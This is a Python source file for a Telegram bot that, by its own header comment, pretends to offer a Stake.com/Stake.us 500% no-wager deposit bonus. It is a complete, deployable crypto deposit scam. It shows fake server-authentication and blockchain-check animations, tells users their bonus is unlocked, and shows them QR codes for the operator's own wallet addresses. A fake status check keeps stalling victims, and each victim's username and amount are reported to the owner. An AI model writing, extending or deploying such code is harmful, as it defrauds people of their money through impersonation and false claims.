# main.py
# Telegram bot that pretends to be a Stake.com / Stake.us 500% deposit bonus claimer
# Uses aiogram 3.x (async), qrcode for QR codes, dotenv for config
# Deployed e.g. on Railway.app

import asyncio
import logging
import random
from datetime import datetime
from io import BytesIO

import qrcode
from aiogram import Bot, Dispatcher, Router, types
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command, Text
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv
import os

load_dotenv()

# ────────────────────────────────────────────────
#                CONFIGURATION
# ────────────────────────────────────────────────

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))  # your Telegram numeric ID

ADDRESSES = {
    "BTC":        os.getenv("BTC_ADDRESS"),
    "ETH":        os.getenv("ETH_ADDRESS"),
    "LTC":        os.getenv("LTC_ADDRESS"),
    "USDT-TRC20": os.getenv("USDT_TRC20"),
    "USDT-ERC20": os.getenv("USDT_ERC20"),
    "SOL":        os.getenv("SOL_ADDRESS"),
    "DOGE":       os.getenv("DOGE_ADDRESS"),
}

# Remove any None / empty addresses
ADDRESSES = {k: v for k, v in ADDRESSES.items() if v and v.strip()}

# ────────────────────────────────────────────────
#                   LOGGING
# ────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

# ────────────────────────────────────────────────
#                      STATES
# ────────────────────────────────────────────────

class DepositForm(StatesGroup):
    username = State()
    amount   = State()
    crypto   = State()

# ────────────────────────────────────────────────
#               FAKE ANIMATION HELPERS
# ────────────────────────────────────────────────

FAKE_HANDSHAKE = [
    "🔗 Connecting to Stake.com servers...",
    "🛡️ Verifying username & ownership...",
    "🔐 Performing secure authentication handshake...",
    "✅ Success! 500% no-wager bonus unlocked."
]

async def fake_typing_sequence(chat_id: int, messages: list[str], delay_min=1.6, delay_max=4.2):
    for text in messages:
        await bot.send_chat_action(chat_id, "typing")
        await asyncio.sleep(random.uniform(delay_min, delay_max))
        await bot.send_message(chat_id, text)

# ────────────────────────────────────────────────
#                    QR CODE
# ────────────────────────────────────────────────

def generate_qr(address: str) -> BytesIO:
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(address)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    
    bio = BytesIO()
    img.save(bio, "PNG")
    bio.name = "qr.png"
    bio.seek(0)
    return bio

# ────────────────────────────────────────────────
#                   KEYBOARDS
# ────────────────────────────────────────────────

def main_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 CLAIM 500% BONUS", callback_data="claim_start")],
        [InlineKeyboardButton(text="🔍 Check Deposit Status", callback_data="check_status")],
    ])

def crypto_keyboard():
    buttons = []
    for currency in ADDRESSES:
        buttons.append([InlineKeyboardButton(text=currency, callback_data=f"crypto_{currency}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ────────────────────────────────────────────────
#                     HANDLERS
# ────────────────────────────────────────────────

@router.message(CommandStart())
async def cmd_start(message: types.Message):
    await message.answer(
        "<b>🎰 Stake.com / Stake.us Bonus Bot</b>\n\n"
        "Claim your <b>500% deposit match</b> — <i>zero wagering requirements!</i>\n"
        "Limited spots — only for verified accounts.\n\n"
        "Press the button below to start →",
        reply_markup=main_menu_keyboard(),
        disable_web_page_preview=True
    )

@router.callback_query(Text("claim_start"))
async def begin_claim(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "Enter your <b>Stake username</b> (exactly as it appears on stake.com / stake.us):"
    )
    await state.set_state(DepositForm.username)
    await callback.answer()

@router.message(DepositForm.username)
async def process_username(message: types.Message, state: FSMContext):
    username = message.text.strip()
    if len(username) < 3:
        await message.answer("Username looks too short. Please try again.")
        return
    
    await state.update_data(username=username)
    
    await fake_typing_sequence(message.chat.id, FAKE_HANDSHAKE)
    
    await message.answer(
        f"✅ Authentication passed!\n"
        f"User <b>{username}</b> verified.\n"
        f"500% bonus (no wagering) is now active.\n\n"
        "Enter deposit amount in <b>USD</b> (min $20 – max $10,000):"
    )
    await state.set_state(DepositForm.amount)

@router.message(DepositForm.amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount < 20 or amount > 10000:
            raise ValueError
    except ValueError:
        await message.answer("Please enter a valid number between 20 and 10000.")
        return
    
    await state.update_data(amount=amount)
    
    await message.answer(
        f"<b>Amount:</b> ${amount:.2f}\n\n"
        "Choose cryptocurrency to deposit with:",
        reply_markup=crypto_keyboard()
    )
    await state.set_state(DepositForm.crypto)

@router.callback_query(lambda c: c.data.startswith("crypto_"))
async def select_crypto(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_", 1)[1]
    if currency not in ADDRESSES:
        await callback.message.answer("That currency is currently unavailable.")
        await callback.answer()
        return
    
    data = await state.get_data()
    amount = data.get("amount")
    username = data.get("username")
    address = ADDRESSES[currency]
    
    qr_bio = generate_qr(address)
    
    text = (
        f"<b>Deposit → {currency}</b>\n\n"
        f"Send <b>${amount:.2f}</b> worth of {currency} to:\n"
        f"<code>{address}</code>\n\n"
        f"• Usually confirms in 1–30 minutes\n"
        f"• Bonus + deposit credited automatically\n"
        f"• <i>No wagering — withdraw anytime</i>\n\n"
        f"Username: {username}\n"
        f"Amount: ${amount:.2f}\n"
        f"Status: <b>Awaiting payment</b>"
    )
    
    await callback.message.answer_photo(
        photo=BufferedInputFile(qr_bio.read(), filename="deposit_qr.png"),
        caption=text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Check Status", callback_data="check_status")],
            [InlineKeyboardButton(text="← Back to Menu", callback_data="main_menu")],
        ])
    )
    
    # Optional: notify yourself
    if OWNER_ID:
        try:
            await bot.send_message(
                OWNER_ID,
                f"New claim attempt\n"
                f"User: @{callback.from_user.username or 'no-username'} ({callback.from_user.id})\n"
                f"Stake: {username}\n"
                f"${amount:.2f} → {currency}\n"
                f"{datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}"
            )
        except:
            pass
    
    await state.clear()
    await callback.answer()

@router.callback_query(Text("check_status"))
async def fake_check_status(callback: types.CallbackQuery):
    await fake_typing_sequence(callback.message.chat.id, [
        "🔍 Querying blockchain...",
        "⚙️ Checking confirmation status...",
        "⏳ Still processing — network is busy..."
    ], 2.0, 5.0)
    
    await callback.message.answer(
        "<b>Current status: Processing</b>\n"
        "Transaction is being confirmed on the blockchain.\n"
        "Expected time: 5–60 minutes depending on network congestion.\n"
        "<i>Do not send again — bonus will appear automatically.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Check Again", callback_data="check_status")],
            [InlineKeyboardButton(text="← Menu", callback_data="main_menu")],
        ])
    )
    await callback.answer()

@router.callback_query(Text("main_menu"))
async def back_to_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Back to main menu.\nReady to claim your <b>500% bonus</b>?",
        reply_markup=main_menu_keyboard()
    )
    await callback.answer()

# ────────────────────────────────────────────────
#                      START
# ────────────────────────────────────────────────

async def main():
    try:
        await dp.start_polling(
            bot,
            allowed_updates=types.AllowedUpdates.MESSAGE + types.AllowedUpdates.CALLBACK_QUERY,
            drop_pending_updates=True
        )
    except Exception as e:
        logger.exception("Polling crashed", exc_info=e)

if __name__ == "__main__":
    asyncio.run(main())
